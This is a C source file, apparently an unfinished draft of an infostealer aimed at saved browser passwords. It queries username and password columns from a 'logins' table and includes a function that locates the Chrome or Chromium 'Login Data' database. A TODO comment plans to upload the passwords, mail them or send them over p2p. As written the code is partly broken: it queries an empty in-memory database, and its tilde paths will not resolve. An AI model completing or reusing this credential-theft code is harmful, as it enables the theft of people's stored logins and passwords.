#include <stdio.h>
#include <sqlite3.h>
#include <unistd.h>


char *get_db_path();

int main(void){

	// get version (only used to verify that sqlite3 was included correctly)
	printf("%s\n", sqlite3_libversion());

	// create db handle
	sqlite3 *db;

	// make sql statement
	sqlite3_stmt *res;

	int status = sqlite3_open(":memory:", &db);

	if (status != SQLITE_OK){
		printf("Error opening database\n");
	}
	else{
		printf("Database successfully opened\n");
	}


	// compile a SQL statement and put it in 4th parameter
	status = sqlite3_prepare_v2(db, "SELECT username_value FROM logins;", -1, &res, 0); // 2nd parameter is the statement
	status = sqlite3_prepare_v2(db, "SELECT password_value FROM logins;", -1, &res, 0); // 2nd parameter is the statement
	//2do: 	read correct DB (google password database -> and write function to locate database)
	//	Read passwords
	//	Upload passwords or send via mail (or even p2p)

	char *db_path = get_db_path();
	printf("%s\n", db_path);

	return 0;

}

/*
 *Get database path (for chrome / chromium / brave)
 */
char *get_db_path(){

	char *db_path_chromium = "~/.config/chromium/Default/Login Data";
	char *db_path_chrome = "~/.config/google-chrome/Default/Login Data";

	if ( access(db_path_chrome, F_OK) == 0 ) { // chrome is installed
		return db_path_chrome;
	}
	else if( access(db_path_chromium, F_OK) == 0 ) { // chromium is installed
		return db_path_chromium;
	}

	return 0;
}
